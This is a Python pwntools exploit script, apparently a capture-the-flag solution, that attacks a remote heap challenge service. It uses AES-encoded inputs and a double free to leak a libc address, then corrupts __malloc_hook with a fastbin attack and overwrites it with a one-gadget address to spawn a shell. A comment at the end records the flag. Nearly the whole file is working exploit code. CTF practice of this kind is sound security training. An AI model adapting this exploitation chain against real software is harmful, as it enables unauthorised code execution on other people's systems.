from binascii import unhexlify, hexlify

from Crypto.Cipher import AES
from pwn import *

exe = ELF('./chall')
context.binary = exe
host = '35.245.143.0'
port = 1337

io = connect(host, port)

io.recvuntil('IV:')
IV = io.recvn(32)
if args.LOCAL:
    KEY = b'YELLOWSUBMARINES'
else:
    KEY = b'\x59\x49\xee\xbb\x28\xe0\xdf\x11\xfe\xac\x0b\x73\xbd\xb4\xdb\xa2'
log.info('IV: {}'.format(IV.decode()))
io.recvuntil(':')
io.sendline('AAA')


# helpers
def enc(data):
    text = AES.new(KEY, AES.MODE_CBC, unhexlify(IV))
    return hexlify(text.encrypt(data))


def check(data):
    j = AES.new(KEY, AES.MODE_CBC, unhexlify(IV))
    return hexlify(j.encrypt(data))


def dec(data):
    j = AES.new(KEY, AES.MODE_CBC, unhexlify(IV))
    return j.decrypt(data)


def conceal(idx, size, data):
    io.sendlineafter('ID:', str(idx))
    io.sendlineafter('quest\n', '1')
    io.sendlineafter('size:\n', str(size))
    io.sendlineafter('plaintext:', data)


def remove(idx):
    io.sendlineafter('ID:', str(idx))
    io.sendlineafter('quest\n', '3')


def changename(data):
    io.sendlineafter('ID:', '1')
    io.sendlineafter('quest\n', '2')
    io.sendafter('name:', data)
    io.sendlineafter('IV(16 bytes):', unhexlify(IV))


def mypad(data):
    s = len(data)
    if s < 16:
        for i in range(s, 16):
            data += b'\x00'
    return data


def tosend(data):
    return dec(mypad(data))


def send(data):
    s = len(data)
    if s < 32:
        for i in range(s, 32):
            data += b'\x00'
    cipher = AES.new(KEY, AES.MODE_CBC, unhexlify(IV))
    return cipher.decrypt(data)


def getshell():
    io.recv()
    io.sendline('9')
    io.recv()
    io.sendline('1')
    io.recv()
    io.sendline('10')
    io.recv()
    io.sendline('1')


malloc_hook = 0x3c4b10
# 0x4527a,0xf0364,0xf1207

conceal(1, 0x70, tosend(b'HKHK'))
conceal(2, 0x58, tosend(b'HKHK'))
conceal(3, 0x58, tosend(b'HKHK'))
remove(1)
remove(2)
remove(3)
remove(2)
conceal(4, 0x70, b'\x00')
io.recvuntil('concealed!\n')
libc_base = u64(unhexlify(io.recvn(12)) + b'\x00\x00') - 0x3c4b78
log.info('Libc leak: {}'.format(hex(libc_base)))
conceal(5, 0x58, tosend(p64(libc_base + malloc_hook - 0x23)))
conceal(6, 0x58, tosend('HKHK'))
conceal(7, 0x58, tosend('HKHK'))
conceal(8, 0x58, send(b'A' * (32 - 13) + p64(libc_base + 0x4527a)))
getshell()
io.interactive()

# FLAG --> inctf{th4t5_4ll_f0lks_say_th3_bUgs_b1daf2789929}
